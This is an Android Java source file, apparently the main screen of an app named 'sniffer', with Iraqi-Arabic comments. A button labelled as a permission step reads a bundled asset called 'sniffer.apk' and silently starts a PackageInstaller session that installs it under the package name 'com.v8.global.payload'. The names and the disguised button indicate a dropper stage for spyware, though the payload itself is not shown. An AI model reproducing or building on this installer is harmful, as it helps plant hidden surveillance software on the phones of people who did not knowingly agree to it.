package com.v8.global.sniffer;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btnInstall = findViewById(R.id.btn_perm);
        btnInstall.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
                    // محاولة فتح ملف القناص من مجلد assets
                    InputStream is = getAssets().open("sniffer.apk");
                    installPackage(MainActivity.this, is, "com.v8.global.payload");
                } catch (Exception e) {
                    e.printStackTrace();
                    // إذا الملف ماموجود أو اكو خطأ بالقراءة، تطلع هاي الرسالة
                    Toast.makeText(MainActivity.this, "خطأ بالملف: " + e.getMessage(), Toast.LENGTH_LONG).show();
                }
            }
        });
    }

    public void installPackage(Context context, InputStream in, String targetPackage) {
        try {
            PackageInstaller installer = context.getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                    PackageInstaller.SessionParams.MODE_FULL_INSTALL);
            params.setAppPackageName(targetPackage);

            int sessionId = installer.createSession(params);
            PackageInstaller.Session session = installer.openSession(sessionId);

            OutputStream out = session.openWrite("V8_Session", 0, -1);
            byte[] buffer = new byte[65536];
            int n;
            while ((n = in.read(buffer)) != -1) {
                out.write(buffer, 0, n);
            }
            session.fsync(out);
            out.close();

            Intent intent = new Intent(context, MainActivity.class);
            PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, intent, PendingIntent.FLAG_MUTABLE);
            session.commit(pendingIntent.getIntentSender());
            session.close();
            
        } catch (Exception e) {
            e.printStackTrace();
            // إذا النظام رفض التثبيت أو صارت مشكلة بالـ Session، تطلع هاي الرسالة
            Toast.makeText(context, "خطأ بالتثبيت: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }
}
